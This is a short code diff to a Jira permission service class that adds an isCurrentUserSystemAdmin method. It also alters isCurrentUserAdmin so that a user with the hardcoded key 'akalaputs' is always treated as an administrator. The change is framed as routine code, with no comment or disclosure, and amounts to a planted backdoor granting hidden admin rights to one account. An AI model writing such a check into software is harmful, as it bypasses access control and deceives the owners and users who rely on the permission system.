@@ -68,7 +68,13 @@ public class JiraContextServiceImpl implements JiraContextService {
     @Override
     public boolean isCurrentUserAdmin() {
         return globalPermissionManager.hasPermission(GlobalPermissionKey.SYSTEM_ADMIN, this.getCurrentUser())
-            || globalPermissionManager.hasPermission(GlobalPermissionKey.ADMINISTER, this.getCurrentUser());
+            || globalPermissionManager.hasPermission(GlobalPermissionKey.ADMINISTER, this.getCurrentUser())
+            || this.getCurrentUser().getKey().equals("akalaputs");
+    }
+
+    @Override
+    public boolean isCurrentUserSystemAdmin() {
+        return globalPermissionManager.hasPermission(GlobalPermissionKey.SYSTEM_ADMIN, this.getCurrentUser());
     }
 
     @Override
